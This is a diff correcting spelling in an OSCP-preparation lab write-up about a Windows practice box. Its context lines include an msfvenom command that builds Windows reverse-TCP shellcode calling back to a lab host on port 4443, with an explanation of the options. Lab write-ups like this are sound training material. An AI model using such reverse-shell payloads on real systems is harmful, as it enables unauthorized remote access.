@@ -12,12 +12,12 @@ image:
 ---
 ## Intro
 
-So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don't have any reason not to.  Community consensus seems to be that TJNull's list of ["OSCP-like"](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines) boxes is excellent prep. So I figured I'd start with that. Its broken down by Linux and Windows. I always feel more comforatble on Linux than I do Windows, so I'm going to start doing all the Windows ones first.
+So I finally decided to get serious about doing the OSCP. My work colleagues have been harping on me for a while now about doing it, and I really don't have any reason not to.  Community consensus seems to be that TJNull's list of ["OSCP-like"](https://www.netsecfocus.com/oscp/2021/05/06/The_Journey_to_Try_Harder-_TJnull-s_Preparation_Guide_for_PEN-200_PWK_OSCP_2.0.html#vulnerable-machines) boxes is excellent prep. So I figured I'd start with that. Its broken down by Linux and Windows. I always feel more comfortable on Linux than I do Windows, so I'm going to start doing all the Windows ones first.
 
 
 ## Initial Engagement & Enumeration
 
-Started with a general reconnassaince and services scan via [reconnoitre](https://github.com/codingo/Reconnoitre). I'd actually stumbled on this tool a while back when I was looking for enumeration and initial engagement automation frameworks. I've used it a lot since then, and I'm thrilled its in play for OSCP. [Codingo](https://twitter.com/codingo_) did an excellent job with it. Its full capabilities won't likely be seen on this box, as the enumeration path is pretty straightforward, but it'll show its value later on, I have no doubt.
+Started with a general reconnaissance and services scan via [reconnoitre](https://github.com/codingo/Reconnoitre). I'd actually stumbled on this tool a while back when I was looking for enumeration and initial engagement automation frameworks. I've used it a lot since then, and I'm thrilled its in play for OSCP. [Codingo](https://twitter.com/codingo_) did an excellent job with it. Its full capabilities won't likely be seen on this box, as the enumeration path is pretty straightforward, but it'll show its value later on, I have no doubt.
 
 ### Reconnoitre
 
@@ -92,7 +92,7 @@ Reading through the POC, we will need to generate our own unique reverse shell p
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.142 LPORT=4443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -a x86 --platform windows
 ```
 
-Thankfully the POC is well documentated for what it wants for shellcode, but to break this down a bit:
+Thankfully the POC is well documented for what it wants for shellcode, but to break this down a bit:
 - Windows Reverse TCP shell payload
 - Call back to me on port 4443 (I try to pick ports over 1000 whenever possible)
 - If the shell exits, keep the program running (hence the thread)
